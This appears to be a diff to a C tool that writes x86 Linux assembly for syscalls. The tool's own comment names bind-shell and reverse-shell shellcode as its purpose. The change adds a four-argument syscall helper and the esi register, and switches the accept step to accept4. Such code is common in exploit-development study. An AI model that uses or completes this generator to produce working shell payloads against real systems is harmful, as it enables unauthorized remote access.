@@ -18,7 +18,7 @@
 #define DEFAULT_PATH    "temp.nasm"
 #define SKIP_PARAM      -1              // omit parameter to syscall
 
-typedef enum {eax, ebx, ecx, edx, esp} reg32_t;
+typedef enum {eax, ebx, ecx, edx, esi, esp} reg32_t;
 
 int temp_fd;
 
@@ -36,6 +36,8 @@ static void store_in_reg(uint32_t value, reg32_t reg);
 
 
 /* To write "recipes" for bind shell, reverse shell, etc. */
+static void build_syscall4(uint16_t syscall, uint32_t arg_ebx, uint32_t arg_ecx,
+    uint32_t arg_edx, uint32_t arg_esi); 
 static void build_syscall3(uint16_t syscall, uint32_t arg_ebx, uint32_t arg_ecx,
     uint32_t arg_edx); 
 static void build_syscall2(uint16_t syscall, uint32_t arg_ebx, uint32_t arg_ecx); 
@@ -215,6 +217,9 @@ static const char * enum2reg32(reg32_t reg)
         case edx:
             reg_name = "edx";
             break;
+        case esi:
+            reg_name = "esi";
+            break;
         case esp:
             reg_name = "esp";
             break;
@@ -316,6 +321,31 @@ static void build_syscall3(uint16_t syscall, uint32_t arg_ebx,
     dprintf(temp_fd, "\tint 0x80\n\n"); 
 } 
 
+static void build_syscall4(uint16_t syscall, uint32_t arg_ebx, 
+    uint32_t arg_ecx, uint32_t arg_edx, uint32_t arg_esi)
+{
+    dprintf(temp_fd, "\t; Syscall %d: (%d, %d, %d, %d)\n",
+        syscall, arg_ebx, arg_ecx, arg_edx, arg_esi);
+
+    store_in_reg(syscall, eax);
+    if (arg_ebx != SKIP_PARAM)
+    {
+        store_in_reg(arg_ebx, ebx);
+    }
+    if (arg_ecx != SKIP_PARAM)
+    {
+        store_in_reg(arg_ecx, ecx);
+    }
+    if (arg_edx != SKIP_PARAM)
+    {
+        store_in_reg(arg_edx, edx);
+    }
+    if (arg_esi != SKIP_PARAM)
+    {
+        store_in_reg(arg_esi, esi);
+    }
+    dprintf(temp_fd, "\tint 0x80\n\n"); 
+} 
 int main(int argc, char * argv[])
 {
     uint16_t port;
@@ -379,8 +409,8 @@ int main(int argc, char * argv[])
      */
 
     // accept(fd, 0, 0)
-    build_syscall3(SYS_accept4, SKIP_PARAM, 0, 0);
-    // TODO: correct or broken b/c of accept4 in place of accept?
+    build_syscall4(SYS_accept4, SKIP_PARAM, 0, 0, 0); 
+    // accept is in syscall table and yet not supported... odd.
 
     // pass connected fd to next syscall
     store_result(eax, ebx);
